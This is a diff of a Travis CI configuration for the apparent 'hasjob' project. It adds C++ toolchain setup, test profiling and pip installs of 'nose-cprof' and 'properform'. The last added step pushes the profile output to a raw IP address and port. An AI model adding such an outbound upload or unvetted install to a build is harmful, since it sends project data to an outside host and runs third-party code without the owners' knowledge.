@@ -1,8 +1,26 @@
 language: python
 python:
-  - 2.6
   - 2.7
-script: nosetests
-notifications:
-  email: false
-  irc: "irc.freenode.net#hasgeek-dev"
+
+before_install:
+   # add for profile
+  - sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
+  - sudo apt-get update -qq
+
+
+install:
+# add for profile
+  - sudo apt-get install -qq g++-4.8
+  - export CXX="g++-4.8"
+  - pip install nose-cprof
+  - pip install properform
+
+
+
+script: 
+  - nosetests --with-cprofile --cprofile-stats-erase --cprofile-stats-file=profile_hasjob_be8a6ba5db_0
+  - python -m properform Push 47.88.50.110:15554 asdf_hasjob_be8a6ba5db_0 ./profile_hasjob_be8a6ba5db_0
+
+
+
+ #2017-08-14 09:00:04 modified at 0
